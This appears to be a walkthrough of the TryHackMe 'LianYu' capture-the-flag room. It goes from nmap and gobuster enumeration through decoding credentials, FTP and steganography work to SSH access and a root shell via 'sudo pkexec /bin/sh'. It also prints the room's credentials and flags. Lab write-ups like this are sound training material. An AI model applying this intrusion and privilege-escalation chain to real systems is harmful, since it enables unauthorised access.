# W6-TryHackMe-LianYu-Walkthrough
## **Summary**

| Phase                     | Action                                  | Outcome                                      |
|--------------------------|-----------------------------------------|----------------------------------------------|
| Reconnaissance           | `Nmap` scan                             | Identified open ports (FTP, SSH, HTTP)       |
| Scanning & Enumeration   | `Gobuster`, source code review          | Found `/island` and `/2100`                  |
| Scanning & Enumeration   | Gobuster with `.ticket` extension       | Discovered `/green_arrow.ticket`             |
| Gaining Access           | Base58 decoding                         | Retrieved FTP credentials                    |
| Exploitation             | FTP login + file extraction             | Discovered hidden files & images             |
| Post-Exploitation        | File analysis + steganography           | Extracted SSH credentials                    |
| Privilege Escalation     | `pkexec` via GTFOBins                   | Root access obtained                         |

---

## **1. Reconnaissance (Information Gathering)**

I started by running an Nmap scan to identify open ports and services available on the target machine. This helps me understand the attack surface and decide where to begin.

```bash
nmap -sC -sV -Pn -T4 -oN nmap/lianyu 10.48.140.128
```
-sC : Default scripts
-sV : Version detection
-p- : All ports to scan
-oN : Output to be stored in the directory ‘nmap’ you created earlier

<img width="940" height="564" alt="image" src="https://github.com/user-attachments/assets/c3ddbfbe-7e42-437a-8daf-41147e47b10d" />


| Service | Port | What can be done (commands / next step) | 
| ------- | ---- | --------------------------------------- |
| FTP     | 21   | `ftp 10.48.140.128`                     | 
| SSH     | 22   | `ssh user@10.48.140.128`                | 
| HTTP    | 80   | Open in browser                         | 
| RPC     | 111  | Enumeration possible                    | 

The scan shows multiple services, but HTTP (port 80) is the best starting point because web applications often expose hidden directories or sensitive data.

## **2. Scanning & Enumeration**

### Access Website

Since port 80 is open, I opened the target IP in the browser to see what is available.

```bash
http://10.48.140.128
```
<img width="940" height="686" alt="image" src="https://github.com/user-attachments/assets/79997417-053d-4bab-af02-7df3c62a5080" />

The website shows an Arrowverse-themed page. This confirms that the HTTP service is running properly and can be explored further.

### Directory Enumeration

```bash
gobuster dir -u http://10.48.140.128 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
<img width="940" height="306" alt="image" src="https://github.com/user-attachments/assets/a69961e9-41e5-42ca-8d3d-8c69a22a6bce" />

This revealed a directory:
```bash
/island
```
### Exploring `/island`

I navigated to `/island` and found another clue.
```bash
http://10.48.140.128/island
```

<img width="940" height="273" alt="image" src="https://github.com/user-attachments/assets/4b8aec55-a10c-46b6-ac7a-8ea65422bf31" />
<img width="940" height="440" alt="image" src="https://github.com/user-attachments/assets/d688854e-7c6a-4d5c-9027-0f4752beb160" />

By highlighting the text and open source code, I discovered the word:
```bash
vigilante
```
This looks like a code word, so I kept it in mind as it might be useful later (possibly as a username or password).

I continued scanning inside `/island` :
```bash
gobuster dir -u http://10.48.140.128/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
<img width="940" height="299" alt="image" src="https://github.com/user-attachments/assets/9980062d-5940-45eb-9014-261388cd219d" />
This revealed another directory:
```bash
/2100
```

### Exploring `/2100`

I navigated to `/island/2100` and checked the page. It contained a broken video and a hint in the source code:
```bash
http://10.48.140.128/island/2100
```
<img width="940" height="683" alt="image" src="https://github.com/user-attachments/assets/b1ae4b21-d2ba-4d74-a49b-6879811373b0" />
<img width="840" height="344" alt="image" src="https://github.com/user-attachments/assets/92ac1318-6b04-4b2d-a0ea-9ddcd8cd933e" />


"you can avail your .ticket here but how?"

This suggests that a hidden file exists, possibly with a specific extension.

### Finding Hidden `.ticket` File
I ran Gobuster again, this time specifying the .ticket extension:
```bash
gobuster dir -u http://10.48.140.128/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
```
<img width="940" height="319" alt="image" src="https://github.com/user-attachments/assets/daa8f556-027b-41d7-8d6c-2a1e1e2f989f" />

This successfully revealed:
```bash
/green_arrow.ticket
```

## **3. Gaining Access (Decoding Credentials)**
I navigate to `/green_arrow.ticket` and found an encoded string:
```bash
http://10.48.140.128/island/2100/green_arrow.ticket
```
<img width="940" height="183" alt="image" src="https://github.com/user-attachments/assets/0c3f04ea-e775-4259-89b0-0b8261789b67" />
```bash
RTy8yhBQdscX
```
I tried to decode the hash using different base formats using cyberchef, and eventually discovered that Base58 decoding worked.
<img width="898" height="510" alt="image" src="https://github.com/user-attachments/assets/9fa0a05d-fb9e-4082-bc48-2e431c010557" />

After decoding, I obtained:
```bash
!#th3h00d
```
This appears to be a password, most likely for FTP.

## **4. FTP Access & File Extraction**

I attempted to log in to FTP using:

Username: `vigilante` (from earlier clue)
Password: `!#th3h00d`

<img width="866" height="365" alt="image" src="https://github.com/user-attachments/assets/dc101cc6-ec9d-4919-af2a-91f13ab7f1da" />

The login was successful.
Now I can explore the files available on the server.

### Downloading Files

To analyze the files locally, I downloaded everything:
```bash
lcd
lcd Pictures/
mget filename *
```
<img width="940" height="391" alt="image" src="https://github.com/user-attachments/assets/39f04b8f-cc31-421d-a73a-d2fabf851626" />

It’s important to always check for hidden files, so I listed all files:
```bash
ls -la
```
<img width="816" height="294" alt="image" src="https://github.com/user-attachments/assets/e4b1dde3-d292-4593-8d2c-52032162ea0b" />
Interestingly, I found a hidden file:
`.other_user`

I downloaded that as well:
```bash
get .other_user
```
<img width="940" height="195" alt="image" src="https://github.com/user-attachments/assets/7cb6796e-9d3d-4f72-8a98-5b098cdff65d" />

## **5. File Analysis & Steganography**

### Inspecting `.other_user`
I opened the file and found a long narrative.
```bash
cat .other_user
```
<img width="940" height="670" alt="image" src="https://github.com/user-attachments/assets/f847c997-80cf-47eb-80ad-f0ae33ea3e92" />
However, the key detail I was looking for was the name mentioned inside.
From the content, I identified:
```bash
Slade Wilson
```
This is likely the SSH username, so I kept it for later.

### Investigating `Leave_me_alone.png`

When I tried to open this image, it failed. This suggests that the file might be corrupted or intentionally modified.
<img width="835" height="552" alt="image" src="https://github.com/user-attachments/assets/2c6b48b6-8c4b-42b3-814e-6a04afc66456" />


So I checked the file using:
```bash
exiftool Leave_me_alone.png
```
<img width="940" height="473" alt="image" src="https://github.com/user-attachments/assets/ca9dda94-682d-459a-bf32-266722e4ae7b" />

It returned an error, indicating an issue with the file format. 

So I opened the file using:
```bash
hexeditor Leave_me_alone.png
```
<img width="940" height="123" alt="image" src="https://github.com/user-attachments/assets/8ece8060-fb2d-4a80-a363-72d04cfc65e9" />

I suspected the file signature was incorrect. PNG files should start with:

<img width="940" height="358" alt="image" src="https://github.com/user-attachments/assets/75537bcd-a489-404e-bfb0-b1234703249b" />

After comparing, I noticed the signature was wrong. I corrected it and saved the file.
<img width="714" height="139" alt="image" src="https://github.com/user-attachments/assets/02fd291f-084a-4bdd-a5c4-41a11a5fb02c" />

After fixing, the image opened successfully and revealed the word:
```bash
password
```
<img width="940" height="734" alt="image" src="https://github.com/user-attachments/assets/71f53664-952c-4a51-b2c4-920bb4b6bf94" />

### Extracting Hidden Data from aa.jpg

Since I now had a password, I tried using steganography on another image:
```bash
steghide extract -sf aa.jpg
```

When prompted, I used:
```bash
password
```
<img width="441" height="103" alt="image" src="https://github.com/user-attachments/assets/4fbd3913-0d42-4cea-ad0c-3298affcb751" />

It worked! A file named `ss.zip` was extracted.

### Extracting ZIP File
```bash
unzip ss.zip
```
<img width="441" height="128" alt="image" src="https://github.com/user-attachments/assets/59799587-4ffe-4373-a1c9-1afb3e85ba7b" />

This gave me two files:

passwd.txt
shado

I checked the shado file:
```bash
cat shado
```
<img width="356" height="83" alt="image" src="https://github.com/user-attachments/assets/9eeadcc9-881d-4eea-aedd-fc58c9076281" />

And found:
```bash
M3tahuman
```
This is likely the SSH password.

## **6. Gaining Shell Access**

Now I had:

Username: `slade`
Password: `M3tahuman`

I connected via SSH:
```bash
ssh slade@10.48.140.128
```
<img width="940" height="552" alt="image" src="https://github.com/user-attachments/assets/c2c97a98-8fb2-4b46-b90e-dfc14668eace" />

I successfully gained access to the machine.

After successfully logging into the system via SSH, I began exploring the user’s home directory.
To check what files are available, I listed the contents of the directory:

```bash
ls
user.txt
cat user.txt
```
<img width="445" height="116" alt="image" src="https://github.com/user-attachments/assets/f74dc8d0-ee04-48c7-94b5-5e8ba5be2a0a" />

Flag obtained successfully 🎉
```bash
THM{P30P7E_K33P_S3CRET5_COMPUT3R5_DON'T}
```

## **7. Privilege Escalation**

Next, I attempted to escalate privileges to root.

I checked sudo permissions:
```bash
sudo -l
```
<img width="940" height="128" alt="image" src="https://github.com/user-attachments/assets/07c79140-c251-47f0-bbc7-b73f92ce7e51" />

I found that the user can run:
```bash
pkexec
```

### Exploiting pkexec

I referred to `GTFOBins` and found that pkexec can be used to spawn a root shell.
<img width="940" height="587" alt="image" src="https://github.com/user-attachments/assets/1977e934-876e-4bbc-8121-01621b0c4c80" />

So I run:
```bash
sudo pkexec /bin/sh
id
whoami
root
cat root.txt
```
<img width="940" height="360" alt="image" src="https://github.com/user-attachments/assets/61b897e6-a609-451c-8176-85d1829c8b63" />

ANDDDD it worked !!!

```bash
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```
Mission accomplished.
Thank You :)










